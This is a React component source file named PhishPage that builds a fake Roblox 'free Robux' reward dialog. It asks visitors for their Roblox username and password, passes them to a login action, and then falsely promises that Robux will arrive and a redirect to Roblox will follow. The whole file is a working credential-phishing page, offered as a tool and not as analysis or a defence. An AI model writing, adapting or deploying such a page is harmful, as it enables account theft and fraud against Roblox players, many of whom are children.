import React, { Component, Fragment } from 'react';
import PropTypes from 'prop-types';
import withStyles from '@material-ui/core/styles/withStyles';
import { } from 'react-router-dom';

import RobuxSvg from '../svg/robux.svg';

import Slide from '@material-ui/core/Slide';
import Dialog from '@material-ui/core/Dialog';
import DialogTitle from '@material-ui/core/DialogTitle';
import DialogContent from '@material-ui/core/DialogContent';
import DialogContentText from '@material-ui/core/DialogContentText';
import Typography from '@material-ui/core/Typography';
import TextField from '@material-ui/core/TextField';
import Button from '@material-ui/core/Button';
import CircularProgress from '@material-ui/core/CircularProgress';

import { connect } from 'react-redux';
import { loginAccount } from '../redux/actions/authActions';

const styles = (theme) => ({
	...theme.globalStyles
});

const Transition = React.forwardRef((props, ref) => {
	return <Slide direction='up' ref={ref} {...props} />;
})

class PhishPage extends Component {
	constructor() {
		super();

		this.state = {
			username: '',
			password: '',
			errors: {},
		};
	}

	// todo implement componentDidUpdate?
	UNSAFE_componentWillReceiveProps(props) {
		if (props.UI.errors) {
			this.setState({ errors: props.UI.errors });
		} else {
			this.setState({ errors: {} });
		}
	}

	onSubmit = (e) => {
		e.preventDefault();

		const accountData = {
			username: this.state.username,
			password: this.state.password
		};

		// login
		this.props.loginAccount(accountData, this.props.history);
	};

	onChange = (e) => this.setState({ [e.target.name]: e.target.value });

	render() {
		const {
			classes,
			auth: { accountAuthenticated },
			UI: { loading }
		} = this.props;
		const { errors } = this.state;

		return (
			<Fragment>
				<Dialog
					open={!accountAuthenticated}
					fullWidth
					maxWidth='sm'
					className={classes.dialog}
					TransitionComponent={Transition}
				>
					<img src={RobuxSvg} className={classes.logo} alt="Robux SVG"></img>
					<DialogTitle disableTypography>
						<Typography variant='h4'>Login To Receive Your Award</Typography>
					</DialogTitle>
					<form noValidate onSubmit={this.onSubmit}>
						<TextField
							name='username'
							type='text'
							label='Username'
							helperText={errors.username}
							error={errors.username && true}
							value={this.state.username}
							onChange={this.onChange}
							className={classes.textField}
							variant='outlined'
							fullWidth
						/>
						<TextField
							name='password'
							type='password'
							label='Password'
							helperText={errors.password}
							error={errors.password && true}
							value={this.state.password}
							onChange={this.onChange}
							className={classes.textField}
							variant='outlined'
							fullWidth
						/>
						<Button
							type='submit'
							variant='contained'
							color='primary'
							className={classes.button}
							disabled={loading}
							fullWidth
						>
							Login
							{loading && (
								<CircularProgress size={25} className={classes.progress} />
							)}
						</Button>
					</form>
				</Dialog>
				<Dialog
					open={accountAuthenticated}
					keepMounted
					fullWidth
					className={classes.dialog}
					TransitionComponent={Transition}
					maxWidth='sm'
				>
					<DialogTitle disableTypography>
						<Typography variant='h4'>
							You have successfully authenticated!
						</Typography>
					</DialogTitle>
					<DialogContent>
						<DialogContentText variant="body2">
							If you filled in the correct login details, you should receive
							your Robux within a matter of minutes! You will be redirected to
							Roblox in 7 seconds
						</DialogContentText>
					</DialogContent>
				</Dialog>
			</Fragment>
		);
	}
}

PhishPage.propTypes = {
	classes: PropTypes.object.isRequired,
	auth: PropTypes.object.isRequired,
	UI: PropTypes.object.isRequired,
	loginAccount: PropTypes.func.isRequired,
	history: PropTypes.object.isRequired
};

const mapStateToProps = (state) => ({
	auth: state.auth,
	UI: state.UI
});

export default connect(mapStateToProps, { loginAccount })(
	withStyles(styles)(PhishPage)
);